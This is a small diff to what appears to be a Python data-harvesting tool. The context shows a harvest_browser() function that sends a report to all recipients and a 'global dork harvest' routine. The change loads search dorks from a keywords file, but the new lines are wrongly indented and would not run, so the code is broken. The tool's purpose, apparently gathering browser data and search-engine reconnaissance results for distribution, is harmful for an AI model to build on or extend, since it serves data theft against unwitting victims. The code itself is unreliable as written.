@@ -91,7 +91,9 @@ def harvest_browser():
     send_to_all(report)
 
 # === 100 REAL 2025 DORKS ===
-DORKS = dkeywords.txt
+DORKS = []
+    with open('dkeywords.txt', 'r') as f:
+        DORKS = [line.strip() for line in f if line.strip()]
 
 def global_dorks():
     report = "† GLOBAL DORK HARVEST †\n"
